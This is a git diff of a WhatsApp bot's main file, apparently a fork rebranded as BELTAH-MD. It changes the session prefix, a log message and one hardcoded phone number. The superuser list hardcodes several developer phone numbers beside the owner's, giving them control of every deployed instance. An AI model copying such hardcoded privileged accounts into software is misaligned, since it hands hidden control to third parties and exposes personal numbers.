@@ -47,7 +47,7 @@ const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
 let { reagir } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/Zokou-MD-WHATSAPP-BOT;;;=>/g,"");
+var session = conf.session.replace(/BELTAH-MD;;;/g,"");
 const prefixe = conf.PREFIXE;
 
 
@@ -65,7 +65,7 @@ async function authentification() {
         }
     }
     catch (e) {
-        console.log("Session Invalide " + e);
+        console.log("Session Invalid " + e);
         return;
     }
 }
@@ -134,7 +134,7 @@ setTimeout(() => {
             var servBot = idBot.split('@')[0];
             /* const dj='22559763447';
              const dj2='254751284190';
-             const luffy='22891733300'*/
+             const luffy='254762016957'*/
             /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
               var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
@@ -157,7 +157,7 @@ setTimeout(() => {
             const dj = '22559763447';
             const dj2 = '254751284190';
             const dj3 = "254742063632";
-            const luffy = '22891733300';
+            const luffy = '254762016957';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
